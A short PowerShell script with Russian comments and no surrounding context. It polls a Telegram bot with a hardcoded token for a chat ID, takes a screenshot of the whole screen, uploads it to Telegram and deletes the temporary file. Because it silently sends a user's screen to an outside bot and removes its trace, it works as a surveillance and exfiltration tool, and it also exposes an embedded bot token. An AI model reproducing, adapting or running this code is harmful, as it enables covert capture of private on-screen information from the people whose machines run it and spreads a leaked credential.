$Token = "6885000699:AAG3G9uDs1e1_066psxnYMqRk0C08U10Kcw"
$URL = "https://api.telegram.org/bot$Token"
$chatID = $null

# Получение chatID из обновлений
while (-not $chatID) {
    try {
        $updates = Invoke-RestMethod -Uri "$URL/getUpdates"
        if ($updates.ok -eq $true -and $updates.result.Count -gt 0) {
            $latestUpdate = $updates.result[-1]
            if ($latestUpdate.message -ne $null) {
                $chatID = $latestUpdate.message.chat.id
            }
        }
    } catch {
        Write-Host "Ошибка при получении обновлений: $_"
    }
    Start-Sleep -Seconds 10
}

if ($chatID) {
    try {
        # Создание скриншота
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
        
        $filePath = "$env:temp\sc.png"
        $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()

        # Отправка файла в Telegram
        $response = Invoke-RestMethod -Uri "$URL/sendDocument" -Method Post -Form @{
            chat_id = $chatID
            document = Get-Item -Path $filePath
        }

        # Удаление временного файла
        Remove-Item -Path $filePath -Force
        Write-Host "Скриншот отправлен успешно!"
    } catch {
        Write-Host "Ошибка при отправке сообщения: $_"
    }
} else {
    Write-Host "Не удалось определить chatID."
}

exit
